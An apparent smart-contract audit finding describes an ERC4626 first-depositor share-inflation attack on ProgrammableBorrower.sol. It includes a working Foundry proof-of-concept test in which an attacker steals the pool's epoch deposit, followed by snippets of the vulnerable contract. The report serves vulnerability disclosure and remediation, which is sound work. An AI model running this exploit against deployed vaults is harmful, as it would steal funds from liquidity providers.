### Title
ERC4626 share inflation lets the first vault depositor steal programmable-borrower liquidity - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower` deposits pool funds into an external ERC4626 vault without enforcing a minimum number of returned shares or checking that the received shares represent the deposited assets. If the configured vault is empty before the first programmable-borrower deposit, an unprivileged vault user can execute the classic first-depositor inflation attack and steal the amount swept into the vault at epoch start. [1](#0-0) 

### Finding Description

When an epoch starts, `onStartEpoch` snapshots the borrower's pre-deposit asset balance, then calls `_depositToVault` with all underlying held by the contract. [2](#0-1) 

`_depositToVault` calls `vault.deposit(_assetAmount, address(this))` and accepts whatever number of shares the external vault returns. [1](#0-0) 

For an initially empty ERC4626 vault, the attacker can deposit one wei for one share and then directly donate enough underlying so that the vault price per share exceeds the programmable borrower's subsequent deposit. The borrower's `deposit` then rounds down to zero shares while the underlying remains in the vault and becomes redeemable by the attacker's single share. [3](#0-2) 

The contract's accounting makes the loss explicit: `epochStartVaultAssets` includes the deposited principal, while `_currentVaultAssets()` later converts the borrower's zero-share position to zero assets, producing a vault loss equal to the stolen deposit. [4](#0-3) [5](#0-4) 

The CDO's raw-donation skim does not prevent this attack because the stolen funds are not left as raw underlying on `IdleCDOEpochVariant`; they are captured inside the external vault after `ProgrammableBorrower` deposits them. [6](#0-5) [7](#0-6) 

### Impact Explanation

If an attacker donates `D >= P` after minting the vault's first share, a programmable-borrower deposit of `P` mints zero shares, and redemption of the attacker's one share returns `D + 1 + P`. The attacker's net gain is `P`, so the entire first vault deposit can be stolen. [8](#0-7) 

The theft permanently removes backing from tranche holders. On pool closure or a required withdrawal, the vault position cannot cover the strategy-token principal, so the CDO's borrower pull fails and enters the default path. [9](#0-8) [10](#0-9) 

### Likelihood Explanation

The attack requires the configured ERC4626 vault to be empty or effectively controlled by the attacker's initial share before `ProgrammableBorrower` first deposits into it. That is a realistic deployment condition because `initialize` only checks the vault address and asset, and does not require existing supply, a seeded position, or inflation-resistant accounting. [11](#0-10) 

The attacker can seed the vault after observing the configured vault and before the first `startEpoch`, without any privileged role. The first `startEpoch` then sweeps the borrower's idle balance through the vulnerable deposit call. [12](#0-11) [13](#0-12) 

### Recommendation

Require the received vault shares to represent substantially all of the deposited assets, and revert when `shares == 0` or when `vault.convertToAssets(shares)` is materially below `_assetAmount`. More robustly, only configure ERC4626 vaults with inflation protection such as virtual shares/assets or an irreversible seeded supply, and enforce that invariant during `initialize`/`setVault`. [14](#0-13)

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract Asset is ERC20 {
    constructor() ERC20("Asset", "AST") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract EmptyVault is ERC4626 {
    constructor(IERC20Metadata asset_)
        ERC20("Empty Vault", "EV")
        ERC4626(asset_)
    {}
}

contract MockCDO {
    Asset public immutable asset;

    constructor(Asset asset_) {
        asset = asset_;
    }

    function token() external view returns (address) {
        return address(asset);
    }

    function startEpoch(
        ProgrammableBorrower programmableBorrower,
        uint256 assets
    ) external {
        // Simulates IdleCDOEpochVariant.sendFundsToBorrower followed by the
        // programmable-borrower epoch-start hook.
        asset.transfer(address(programmableBorrower), assets);
        programmableBorrower.onStartEpoch(0);
    }
}

contract ProgrammableBorrowerInflationTest is Test {
    Asset internal asset;
    EmptyVault internal vault;
    ProgrammableBorrower internal programmableBorrower;
    MockCDO internal cdo;

    address internal attacker = address(0xA11CE);
    address internal owner = address(0xB0B);
    address internal manager = address(0xBEEF);
    address internal borrower = address(0xB0440);

    function testFirstVaultDepositorStealsEpochDeposit() external {
        uint256 poolDeposit = 100_000e18;
        uint256 donation = poolDeposit;

        asset = new Asset();
        vault = new EmptyVault(IERC20Metadata(address(asset)));
        cdo = new MockCDO(asset);
        programmableBorrower = new ProgrammableBorrower();

        programmableBorrower.initialize(
            address(vault),
            address(cdo),
            owner,
            manager,
            borrower,
            0
        );

        // Attacker becomes the vault's first depositor and inflates the
        // asset/share ratio above the programmable borrower's deposit.
        asset.mint(attacker, donation + 1);
        vm.startPrank(attacker);
        asset.approve(address(vault), 1);
        vault.deposit(1, attacker);
        asset.transfer(address(vault), donation);
        vm.stopPrank();

        assertEq(vault.totalSupply(), 1);
        assertEq(vault.totalAssets(), donation + 1);

        // Honest LPs funded the CDO during the buffer. Starting the epoch
        // transfers those funds to ProgrammableBorrower, which deposits all of
        // them into the inflated vault and receives zero shares.
        asset.mint(address(cdo), poolDeposit);
        cdo.startEpoch(programmableBorrower, poolDeposit);

        assertEq(programmableBorrower.vaultSharesBalance(), 0);
        assertEq(vault.balanceOf(address(programmableBorrower)), 0);
        assertEq(vault.totalAssets(), donation + 1 + poolDeposit);
        assertEq(programmableBorrower.vaultLoss(), poolDeposit);

        // The attacker's only vault share redeems the donation plus the
        // programmable borrower's entire deposit.
        vm.prank(attacker);
        uint256 redeemed = vault.redeem(1, attacker, attacker);

        assertEq(redeemed, donation + 1 + poolDeposit);
        assertEq(asset.balanceOf(attacker), donation + 1 + poolDeposit);
    }
}

    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.

    // does not treat the just-deposited idle balance as fresh vault profit or loss.

  /// @notice Move a specific amount of idle underlying into the vault.
  /// @param _assetAmount Amount of underlying to deposit
  /// @param _principalAssets Portion of the deposited assets that should extend the epoch principal
  /// baseline instead of being recognized as current-epoch profit.
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
